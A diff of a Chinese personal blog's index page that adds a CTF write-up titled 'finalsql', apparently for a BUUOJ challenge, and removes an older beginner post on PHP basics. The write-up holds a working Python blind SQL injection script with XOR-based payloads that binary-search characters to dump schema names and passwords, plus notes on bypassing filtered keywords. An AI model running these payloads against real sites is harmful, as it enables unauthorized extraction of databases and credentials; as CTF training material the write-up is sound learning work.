@@ -127,7 +127,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -167,6 +167,100 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/19/wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="发福的小菜狗">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/19/wp/" class="post-title-link" itemprop="url">finalsql</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-11-19 20:53:10 / Modified: 21:34:07" itemprop="dateCreated datePublished" datetime="2021-11-19T20:53:10+08:00">2021-11-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="第一次写盲注脚本"><a href="#第一次写盲注脚本" class="headerlink" title="第一次写盲注脚本"></a>第一次写盲注脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">280</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">        url = <span class="string">&quot;http://5ab2fc5d-f744-4401-9552-f1b496e7e678.node4.buuoj.cn:81/search.php&quot;</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查库</span></span><br><span class="line">        <span class="comment">#payload =&quot;?id=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查列</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查表</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查字段</span></span><br><span class="line">        payload= <span class="string">&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment">#查password</span></span><br><span class="line">        url+=payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Cl&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (mid==<span class="number">32</span> <span class="keyword">or</span> mid==<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#print(chr(mid))</span></span><br><span class="line">    flag += <span class="built_in">chr</span> (mid)</span><br><span class="line">    <span class="comment">#print(mid)</span></span><br><span class="line">    <span class="comment">#print(chr(mid))</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="总结步骤"><a href="#总结步骤" class="headerlink" title="总结步骤"></a>总结步骤</h1><ol>
+<li>fuzz查过滤</li>
+<li>考虑查注入</li>
+<li>然后写脚本</li>
+</ol>
+<p><img src="https://i.loli.net/2021/11/19/n5blAoWmT41eLUJ.png" alt="QQ截图20211119210158.png"></p>
+<p>根据提示，尝试对？id=进行fuzz</p>
+<p>发现空格和and和||和$$被过滤了</p>
+<p>而^没有被过滤</p>
+<p>尝试用1^^1</p>
+<p><img src="https://i.loli.net/2021/11/19/dH3Y57PkpW9xgLF.png" alt="QQ截图20211119211628.png"></p>
+<p>可以利用可行的注入符合提供思路</p>
+<p>“1^ 0 ^ 1”为假</p>
+<p>“1 ^ 1 ^ 1”为真来嵌套语句</p>
+<h1 id="利用二分法来简化爆破"><a href="#利用二分法来简化爆破" class="headerlink" title="利用二分法来简化爆破"></a>利用二分法来简化爆破</h1><p>32是空格，ascii最多到127，所以可显字符是32到127</p>
+<p>我们取中间数为mid为80，high为128，low为32（方便除二）</p>
+<p>若这个要猜的值比80大，就到80到128的区间类取中值比较，以此类推，因为这个数必是整数，所以必可以找到。</p>
+<p><img src="https://i.loli.net/2021/11/19/CFx2wMBOHc5yViq.png" alt="QQ截图20211119212958.png"></p>
+<p>最后在一大堆password里面找到。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1331,112 +1425,6 @@
 <p>.\mysql.exe -uroot -p</p>
 </blockquote>
 <p><strong>超级麻烦！！！！</strong></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/01/php%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/10/01/php%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">php语言学习</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-10-01 09:36:29" itemprop="dateCreated datePublished" datetime="2021-10-01T09:36:29+08:00">2021-10-01</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-27 19:41:15" itemprop="dateModified" datetime="2021-10-27T19:41:15+08:00">2021-10-27</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%B8%B8%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">常识</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="PHP学习"><a href="#PHP学习" class="headerlink" title="PHP学习"></a>PHP学习</h1><p><img src="https://i.loli.net/2021/10/03/GIFUdtWZ9jOMyLT.jpg" alt="QQ图片20211003123132.jpg"></p>
-<h2 id="lt-DOCTYPEhtmlPUBLIC”-W3C-DTDXHTML1-0Transitional-EN””http-www-w3-org-TR-xhtml1-DTD-xhtml1transitional-dtd-quot-gt"><a href="#lt-DOCTYPEhtmlPUBLIC”-W3C-DTDXHTML1-0Transitional-EN””http-www-w3-org-TR-xhtml1-DTD-xhtml1transitional-dtd-quot-gt" class="headerlink" title="&lt;!DOCTYPEhtmlPUBLIC”-//W3C//DTDXHTML1.0Transitional//EN””http://www.w3.org/TR/xhtml1/DTD/xhtml1transitional.dtd&quot;&gt;"></a>&lt;!DOCTYPEhtmlPUBLIC”-//W3C//DTDXHTML1.0Transitional//EN””<a target="_blank" rel="noopener" href="http://www.w3.org/TR/xhtml1/DTD/xhtml1transitional.dtd&quot;&gt;">http://www.w3.org/TR/xhtml1/DTD/xhtml1transitional.dtd&quot;&gt;</a></h2><p>这里的“DOCTYPE”（Document Type），是指<strong>文档类型</strong>，一个DOCTYPE是一种标准通用标记语言的文档类型声明，它的目的是要告诉标准通用标记语言解析器，它应该用什么样的文档类型定义（DTD）来解析文档。</p>
-<p>XHTML1.0提供了三种DOCTYPE可选择</p>
-<p>(1)过渡型（Transitional ）</p>
-<p>(2)严格型（Strict ）</p>
-<p>(3)框架型（Frameset ）</p>
-<p>因为过于深奥，我也无法描述其区别，所以这里我只做了解，反正就是文档类型。</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a><strong><u><html xmlns="http://www.w3.org/1999/xhtml"></u></strong></h2><p>xmlns属性 是用来定义xml namespace（命名空间）的，就是定义了一个命名空间。该属性可以放置在文档内任何元素的开始标签中。<del>（就是看懂也没啥用）</del></p>
-<h2 id="和"><a href="#和" class="headerlink" title="  和 "></a><head> </head> 和<body> </body></h2><p>就是html的结构，之间可以改web头部和身体的的颜色元素</p>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><strong><u><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></u></strong></h2><p>meta是html的元标签,其中包含了对应html的相关信息,客户端浏览器或服务端程序都会根据这些信息进行处理 http类型:这个网页是表现内容用的 content(内容类型):这个网页的格式是文本的 charset(编码):这个网页的编码是UTF-8,需要注意的是这个是网页内容的编码,而不是文件本身的.</p>
-<h2 id="lt-php-…-gt"><a href="#lt-php-…-gt" class="headerlink" title="&lt;?php ….&gt;"></a>&lt;?php ….&gt;</h2><p>这里就比较重要，里面是一些执行语法</p>
-<p><img src="https://i.loli.net/2021/10/03/aI52NnplfhD9i8u.jpg" alt="QQ图片20211003123122.jpg"></p>
-<h3 id="include语句在PHP中的作用"><a href="#include语句在PHP中的作用" class="headerlink" title="include语句在PHP中的作用"></a>include语句在PHP中的作用</h3><p><img src="https://i.loli.net/2021/10/03/SUYqJDpaI34zZnB.png" alt="QQ图片20211003123144.png"></p>
-<ul>
-<li><p>error_reporting(0);   意思是不让报错出现</p>
-</li>
-<li><p>if(isset($_GET[‘id’]))   isset()函数用来判断变量是否被定义</p>
-</li>
-<li><p>$fp=fopen(‘result.txt’,’a’);就是打开reasult.txt</p>
-</li>
-<li><p>fwrite($fp,’ID’.$id.\n) 就是写入</p>
-<p><img src="https://i.loli.net/2021/10/03/AW2PbsGEqZF1v4N.png" alt="QQ图片20211003155007.png"></p>
-</li>
-<li><p>fclose($fp)就关闭$fbp</p>
-</li>
-</ul>
-<p>好吧，今天就先到这吧</p>
 
       
     </div>
